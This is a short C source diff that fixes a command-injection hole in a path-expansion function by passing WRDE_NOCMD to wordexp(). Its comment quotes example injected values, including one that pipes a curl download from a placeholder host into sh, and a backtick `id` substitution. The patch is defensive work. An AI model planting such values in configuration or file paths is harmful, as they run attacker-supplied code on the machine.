@@ -1157,8 +1157,14 @@ int ExpandPath(char *String, int BufferLength)
     wordexp_t Result;
 
     /* `wordfree()` must not be called on a `wordexp_t` that `wordexp()`
-       did not fill in. */
-    if( wordexp(String, &Result, 0) != 0 )
+       did not fill in.
+       FIX(#006): flags 0 lets wordexp() perform *command substitution*, so a
+       path such as `Hosts /tmp/$(curl http://x|sh)` or `` `id` `` taken from
+       the configuration file (or from a downloaded hosts URL) was executed by
+       a shell.  WRDE_NOCMD refuses any string containing `$(`, backticks or
+       `$((` and is exactly what is wanted for expanding `${HOME}`-style
+       variables in paths. */
+    if( wordexp(String, &Result, WRDE_NOCMD) != 0 )
     {
         return -1;
     }
